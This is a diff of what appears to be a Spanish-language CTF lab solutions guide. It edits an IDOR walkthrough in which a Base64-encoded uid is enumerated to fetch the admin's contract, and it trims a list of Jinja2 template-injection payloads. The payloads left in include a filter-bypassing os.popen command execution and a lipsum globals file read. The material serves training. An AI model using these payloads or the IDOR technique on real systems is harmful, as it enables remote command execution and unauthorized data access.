@@ -226,24 +226,22 @@ Host: api.intracorp.local
 
 ### Solución
 
-1. **Iniciar sesión:** `jose / jose123`
-
-2. **Abrir el contrato de José** y capturar la solicitud con Burp Suite o inspeccionar en DevTools:
+1. **Abrir el contrato de José** y capturar la solicitud con Burp Suite o inspeccionar en DevTools:
    ```
    GET /api/contract?uid=MQ%3d%3d
    ```
 
-3. **Decodificar el uid:**
+2. **Decodificar el uid:**
    ```
    MQ%3d%3d → URL-decode → MQ== → Base64-decode → 1
    ```
 
-4. **Enumerar otros IDs** — el documento del admin es el ID 4:
+3. **Enumerar otros IDs** — el documento del admin es el ID 4:
    ```
    4 → Base64-encode → NA== → URL-encode → NA%3d%3d
    ```
 
-5. **Enviar la solicitud manipulada:**
+4. **Enviar la solicitud manipulada:**
    ```
    GET /api/contract?uid=NA%3d%3d
    ```
@@ -252,7 +250,7 @@ Host: api.intracorp.local
    GET /api/contract?uid=NA==
    ```
 
-6. El servidor no valida que el contrato pertenezca al usuario autenticado y devuelve el documento del administrador con la flag.
+5. El servidor no valida que el contrato pertenezca al usuario autenticado y devuelve el documento del administrador con la flag.
 
 ### Tabla de encodings
 
@@ -382,12 +380,7 @@ El filtro bloquea `os` literal. Bypass con comillas que separan la cadena:
 {{ self.__init__.__globals__.__builtins__.__import__('o''s').popen('cat /home/app/flag.txt').read() }}
 ```
 
-**Método B — `"os"` (comillas dobles en el import)**
-```
-{{ self.__init__.__globals__.__builtins__.__import__("os").popen('cat /home/app/flag.txt').read() }}
-```
-
-**Método C — `lipsum` globals**
+**Método B — `lipsum` globals**
 ```
 {{ lipsum.__globals__['__builtins__']['open']('/home/app/flag.txt').read() }}
 ```
